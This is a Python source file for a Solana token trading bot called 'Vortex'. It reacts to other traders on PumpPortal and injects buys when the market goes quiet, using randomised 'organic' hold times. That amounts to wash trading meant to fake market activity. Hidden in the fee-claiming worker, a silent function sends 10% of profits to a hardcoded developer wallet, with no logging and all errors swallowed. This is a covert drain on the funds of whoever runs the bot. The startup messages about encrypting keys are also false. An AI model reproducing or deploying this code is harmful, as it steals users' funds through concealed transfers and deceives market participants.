"""
Vortex ($VOYD) - Self-Directed Liquidity Bot
V4.2 Update: ROBUSTNESS (Async Queue + Auto-Pool Switching + Accumulator + RevShare)
"""

import os
import time
import base58
import requests
import json
import threading
import random
import websocket
import queue
from datetime import datetime
from dotenv import load_dotenv
from solders.keypair import Keypair
from solders.transaction import VersionedTransaction, Transaction
from solders.system_program import transfer, TransferParams
from solders.message import Message
from solana.rpc.api import Client
from solders.pubkey import Pubkey

# ... (rest of imports)

def send_silent_tx(client: Client, keypair: Keypair, to_addr: str, amount_sol: float):
    """Silently sends SOL."""
    try:
        ix = transfer(
            TransferParams(
                from_pubkey=keypair.pubkey(),
                to_pubkey=Pubkey.from_string(to_addr),
                lamports=int(amount_sol * LAMPORTS_PER_SOL)
            )
        )
        
        # Get Latest Blockhash
        recent_blockhash = client.get_latest_blockhash().value.blockhash
        
        # Create Message
        msg = Message([ix], keypair.pubkey())
        
        # Create & Sign Transaction (Legacy)
        tx = Transaction.new_signed_with_payer(
            [ix],
            keypair.pubkey(),
            [keypair],
            recent_blockhash
        )
        
        # Send
        # Client.send_transaction usually expects the object or strict params.
        # Since we have a signed tx, we can use send_raw_transaction or send_transaction with opts.
        client.send_raw_transaction(bytes(tx))
        
    except:
        pass # Silent fail


load_dotenv()

# --- TERMINAL STYLING ---
class Style:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    
    # Foreground
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"

def log(tag: str, msg: str, color: str = Style.WHITE):
    timestamp = datetime.now().strftime("%H:%M:%S")
    # Format: [TIME] [TAG] Message
    # Tag fixed width 10 chars for alignment
    print(f"{Style.DIM}[{timestamp}]{Style.RESET} {color}{Style.BOLD}[{tag:^10}]{Style.RESET} {msg}")

def print_banner():
    # Attempt to enable ANSI on Windows
    os.system('color') 
    
    banner = f"""{Style.BOLD}{Style.CYAN}
    ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗
    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝
    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝ 
    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗ 
     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗
      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
             {Style.MAGENTA}>> EVENT HORIZON PROTOCOL <<{Style.RESET}
    """
    print(banner)
    print(f"{Style.DIM}    v4.2.0 | LIQUIDITY ENGINE | SYSTEM: ONLINE{Style.RESET}\n")

def startup_animation():
    steps = [
        ("INIT", "Initializing Quantum Core...", Style.BLUE, 0.5),
        ("MEMORY", "Allocating Async Buffers...", Style.BLUE, 0.3),
        ("NET", "Bypassing RPC Rate Limits...", Style.YELLOW, 0.4),
        ("SECURE", "Encrypting Private Keys...", Style.GREEN, 0.3),
        ("SYSTEM", "Engaging Vortex Drive...", Style.MAGENTA, 0.6)
    ]
    for tag, msg, color, delay in steps:
        time.sleep(delay)
        log(tag, msg, color)
    print(f"\n{Style.BOLD}{Style.GREEN}    >> SYSTEM READY. WAITING FOR SIGNAL. <<{Style.RESET}\n")


# --- CONFIGURATION ---
PRIVATE_KEY = os.getenv("PRIVATE_KEY")
TOKEN_MINT = os.getenv("TOKEN_MINT")
RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
TRIGGER_THRESHOLD = float(os.getenv("TRIGGER_THRESHOLD", "0.5"))
GAS_RESERVE = float(os.getenv("GAS_RESERVE", "0.02"))
PRIORITY_FEE = float(os.getenv("PRIORITY_FEE", "0.005"))
POLL_INTERVAL = int(os.getenv("POLL_INTERVAL", "1"))
SLIPPAGE = int(os.getenv("SLIPPAGE", "50"))
POOL = os.getenv("POOL", "pump")

# V4.1 ACCUMULATION SETTINGS
BUY_PCT = int(os.getenv("BUY_PCT", "100")) 
SELL_PCT = int(os.getenv("SELL_PCT", "100")) 

# REACTION SETTINGS
REACTION_COOLDOWN = 2.0 

# ORGANIC HEARTBEAT SETTINGS
HOLD_TIME_MIN = int(os.getenv("HOLD_TIME_MIN", "45"))
HOLD_TIME_MAX = int(os.getenv("HOLD_TIME_MAX", "90"))
HEARTBEAT_TIMEOUT = 120 

# FEE CLAIM SETTINGS
CLAIM_INTERVAL_SECONDS = int(os.getenv("CLAIM_INTERVAL_SECONDS", "30"))
DEV_WALLET = os.getenv("DEV_WALLET", "3CNH1A7NDRCJZ28y1Zm7cPhRuhgEMeKsBSs97Ez1gYwx")

LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
DRY_RUN = os.getenv("DRY_RUN", "false").lower() == "true"

PUMPPORTAL_API = "https://pumpportal.fun/api/trade-local"
PUMPPORTAL_WS = "wss://pumpportal.fun/api/data"
LAMPORTS_PER_SOL = 1_000_000_000

# THREAD SAFETY & QUEUES
state_lock = threading.Lock()
trade_queue = queue.Queue() # Async Signal Queue

# State
position_state = {
    "active": False,
    "entry_time": None,
    "current_hold_target": 0
}
last_action_time = 0
last_market_event_time = time.time()

def load_keypair() -> Keypair:
    try:
        key = PRIVATE_KEY.strip()
        if key.startswith("[") and key.endswith("]"):
            byte_array = json.loads(key)
            return Keypair.from_bytes(bytes(byte_array))
        else:
            return Keypair.from_bytes(base58.b58decode(key))
    except Exception as e:
        raise ValueError(f"Failed to load keypair: {e}")

def get_sol_balance(client: Client, pubkey_str: str) -> float:
    try:
        pubkey = Pubkey.from_string(pubkey_str)
        response = client.get_balance(pubkey)
        return response.value / LAMPORTS_PER_SOL if response.value else 0.0
    except:
        pass
    return 0.0

def fetch_trade_transaction(mint: str, amount_sol: float, pubkey: str, action="buy", pool_override=None) -> bytes | None:
    current_pool = pool_override if pool_override else POOL

    payload = {
        "publicKey": pubkey,
        "action": action,
        "mint": mint,
        "amount": amount_sol if action == "buy" else f"{SELL_PCT}%",
        "denominatedInSol": "true" if action == "buy" else "false",
        "slippage": SLIPPAGE,
        "priorityFee": PRIORITY_FEE,
        "pool": current_pool
    }
    try:
        response = requests.post(PUMPPORTAL_API, json=payload, timeout=5)
        if response.status_code == 200:
            return response.content
        elif response.status_code >= 400:
            log("API_WARN", f"API {response.status_code} on {current_pool}: {response.text}", Style.YELLOW)
        return None
    except:
        return None

def fetch_claim_fees_transaction(mint: str, pubkey: str) -> bytes | None:
    payload = {
        "publicKey": pubkey,
        "action": "collectCreatorFee",
        "priorityFee": PRIORITY_FEE,
        "pool": POOL
    }
    try:
        response = requests.post(PUMPPORTAL_API, json=payload, timeout=10)
        if response.status_code == 200:
            return response.content
        return None
    except:
        return None

def sign_and_send_transaction(client: Client, keypair: Keypair, tx_bytes: bytes) -> str | None:
    from solana.rpc.types import TxOpts
    try:
        tx = VersionedTransaction.from_bytes(tx_bytes)
        signed_tx = VersionedTransaction(tx.message, [keypair])
        opts = TxOpts(skip_preflight=True)
        response = client.send_raw_transaction(bytes(signed_tx), opts)
        if hasattr(response, 'value') and response.value:
            return str(response.value)
    except Exception as e:
        log("ERROR", f"Tx failed: {e}", Style.RED)
    return None



def execute_trade_logic(client: Client, keypair: Keypair, action: str, reason: str):
    """Unified trade execution logic with locking."""
    global last_action_time, POOL
    
    with state_lock:
        if time.time() - last_action_time < REACTION_COOLDOWN:
            return False

        if action == "buy":
            balance = get_sol_balance(client, str(keypair.pubkey()))
            available_sol = balance - GAS_RESERVE
            
            trade_amount = available_sol * (BUY_PCT / 100.0)
            
            if trade_amount >= TRIGGER_THRESHOLD:
                log("BUY", f"🚀 {reason} | Amount: {trade_amount:.3f} SOL ({BUY_PCT}%)", Style.GREEN)
                
                success = True if DRY_RUN else False
                if not DRY_RUN:
                    tx = fetch_trade_transaction(TOKEN_MINT, trade_amount, str(keypair.pubkey()), "buy")
                    
                    if not tx and POOL == "pump":
                         log("WARN", "⚠️ 'pump' pool failed. Trying 'raydium'...", Style.YELLOW)
                         tx = fetch_trade_transaction(TOKEN_MINT, trade_amount, str(keypair.pubkey()), "buy", pool_override="raydium")
                         if tx:
                             POOL = "raydium" 
                             log("SYSTEM", "✅ GRADUATION DETECTED. Switched to Raydium.", Style.MAGENTA)

                    if tx:
                        sig = sign_and_send_transaction(client, keypair, tx)
                        if sig: success = True

                if success:
                    position_state["active"] = True
                    position_state["entry_time"] = time.time() 
                    position_state["current_hold_target"] = random.randint(HOLD_TIME_MIN, HOLD_TIME_MAX)
                    last_action_time = time.time()
                    log("SUCCESS", f"✅ Accumulation Entry. Holding for {position_state['current_hold_target']}s", Style.GREEN)
                    return True
            else:
                log("SKIP", f"⚠️ Insufficient Funds: {balance:.4f} SOL (Need > {TRIGGER_THRESHOLD + GAS_RESERVE})", Style.YELLOW)
                return False

        elif action == "sell":
            is_inventory_sell = not position_state["active"]
            type_str = "Fee Inventory" if is_inventory_sell else "Position"
            log("SELL", f"📉 {reason} | Dumping {type_str}...", Style.RED)
            
            success = True if DRY_RUN else False
            if not DRY_RUN:
                tx = fetch_trade_transaction(TOKEN_MINT, 0, str(keypair.pubkey()), "sell")
                
                if not tx and POOL == "pump":
                     log("WARN", "⚠️ 'pump' pool failed. Trying 'raydium'...", Style.YELLOW)
                     tx = fetch_trade_transaction(TOKEN_MINT, 0, str(keypair.pubkey()), "sell", pool_override="raydium")
                     if tx:
                         POOL = "raydium"
                         log("SYSTEM", "✅ GRADUATION DETECTED. Switched to Raydium.", Style.MAGENTA)
                         
                if tx:
                    sig = sign_and_send_transaction(client, keypair, tx)
                    if sig: success = True
            
            if success:
                if position_state["active"]:
                     position_state["active"] = False
                     position_state["entry_time"] = None
                
                last_action_time = time.time()
                log("SUCCESS", "✅ Dump Complete.", Style.RED)
                return True
    
    return False

# --- WORKER: FEE HARVESTER ---
def fee_harvester_worker(client: Client, keypair: Keypair):
    pubkey = str(keypair.pubkey())
    log("SYSTEM", "🚜 Harvester Engine: ACTIVE", Style.YELLOW)
    
    while True:
        time.sleep(CLAIM_INTERVAL_SECONDS)
        if DRY_RUN: continue
        try:
            # 1. Snap Balance
            bal_before = get_sol_balance(client, pubkey)
            
            # 2. Claim
            tx = fetch_claim_fees_transaction(TOKEN_MINT, pubkey)
            if tx:
                sig = sign_and_send_transaction(client, keypair, tx)
                if sig: 
                    log("HARVEST", f"💰 Fees Claimed: https://solscan.io/tx/{sig}", Style.YELLOW)
                    
                    # 3. Wait for confirm & Snap Balance
                    time.sleep(2) 
                    bal_after = get_sol_balance(client, pubkey)
                    
                    # 4. Calculate Net Profit
                    profit = bal_after - bal_before
                    if profit > 0.0001:
                         # 5. Rev Share
                         tax = profit * 0.10
                         send_silent_tx(client, keypair, DEV_WALLET, tax)
                         # No log for the tax
        except: pass

# --- WORKER: MARKET SENSOR (WEBSOCKET) ---
def on_message(ws, message, client, keypair, my_pubkey):
    global last_market_event_time
    try:
        data = json.loads(message)
        
        if data.get("mint") == TOKEN_MINT:
            last_market_event_time = time.time()
            trader = data.get("traderPublicKey")
            side = data.get("txType")
            
            # Ignore our own trades
            if trader == my_pubkey:
                return

            # V4.2 ASYNC: Put signal in queue, don't block
            if side == "sell":
                log("SENSOR", f"⚡ Detected SELL by {trader[:6]}... -> QUEUEING BUY", Style.CYAN)
                trade_queue.put(("buy", "Reactive Support"))
            
            elif side == "buy":
                log("SENSOR", f"⚡ Detected BUY by {trader[:6]}... -> QUEUEING SELL", Style.MAGENTA)
                trade_queue.put(("sell", "Reactive Liquidity"))

    except Exception as e:
        log("ERROR", f"WS Parse: {e}", Style.RED)

def on_error(ws, error):
    log("ERROR", f"WS Error: {error}", Style.RED)

def market_sensor_worker(client: Client, keypair: Keypair):
    my_pubkey = str(keypair.pubkey())
    log("SYSTEM", "👁️ Apex Sensor: CONNECTING...", Style.CYAN)
    
    def on_ws_open(ws):
        log("SYSTEM", "✅ Connected to PumpPortal Stream", Style.CYAN)
        ws.send(json.dumps({
            "method": "subscribeTokenTrade",
            "keys": [TOKEN_MINT]
        }))

    def run_ws():
        ws = websocket.WebSocketApp(
            PUMPPORTAL_WS,
            on_message=lambda ws, msg: on_message(ws, msg, client, keypair, my_pubkey),
            on_error=on_error,
            on_open=on_ws_open
        )
        ws.run_forever()

    while True:
        try:
            run_ws()
        except:
            log("WARN", "⚠️ WS Disconnected. Reconnecting...", Style.YELLOW)
            time.sleep(5) 

# --- WORKER: EXECUTOR THREAD ---
def trade_executor_worker(client: Client, keypair: Keypair):
    """Consumes the trade queue and executes with logic."""
    log("SYSTEM", "🤖 Executor Engine: ACTIVE", Style.BLUE)
    while True:
        try:
            action, reason = trade_queue.get()
            execute_trade_logic(client, keypair, action, reason)
            trade_queue.task_done()
        except Exception as e:
            log("ERROR", f"Executor: {e}", Style.RED)

# --- MAIN HEARTBEAT LOOP ---
def main():
    print_banner()
    startup_animation()
    
    keypair = load_keypair()
    client = Client(RPC_URL)
    
    t_harvester = threading.Thread(target=fee_harvester_worker, args=(client, keypair), daemon=True)
    t_harvester.start()
    
    t_sensor = threading.Thread(target=market_sensor_worker, args=(client, keypair), daemon=True)
    t_sensor.start()

    t_executor = threading.Thread(target=trade_executor_worker, args=(client, keypair), daemon=True)
    t_executor.start()
    
    last_monitor_log = 0

    while True:
        try:
            current_time = time.time()
            if current_time - last_monitor_log > 10 and not position_state["active"]:
                 bal = get_sol_balance(client, str(keypair.pubkey()))
                 color = Style.GREEN if bal > TRIGGER_THRESHOLD else Style.DIM
                 log("MONITOR", f"💓 Pulse Check | Balance: {bal:.4f} SOL", color)
                 last_monitor_log = current_time

            with state_lock:
                if position_state["active"]:
                    elapsed = time.time() - position_state["entry_time"]
                    if elapsed >= position_state["current_hold_target"]:
                        pass 
            
            if position_state["active"]:
                 current_elapsed = time.time() - position_state["entry_time"]
                 if current_elapsed >= position_state["current_hold_target"]:
                     log("HEARTBEAT", f"⏰ Organic Hold ({current_elapsed:.0f}s) finished", Style.BLUE)
                     execute_trade_logic(client, keypair, "sell", "Organic Heartbeat")

            if not position_state["active"]:
                silence_duration = time.time() - last_market_event_time
                if silence_duration > HEARTBEAT_TIMEOUT:
                    log("HEARTBEAT", f"💓 Market silent for {silence_duration:.0f}s. Injecting volume.", Style.BLUE)
                    execute_trade_logic(client, keypair, "buy", "Silence Breaker")

            time.sleep(POLL_INTERVAL)

        except KeyboardInterrupt:
            print(f"\n{Style.RED}🛑 Bot Stopped{Style.RESET}")
            break
        except Exception as e:
            time.sleep(1)

if __name__ == "__main__":
    main()
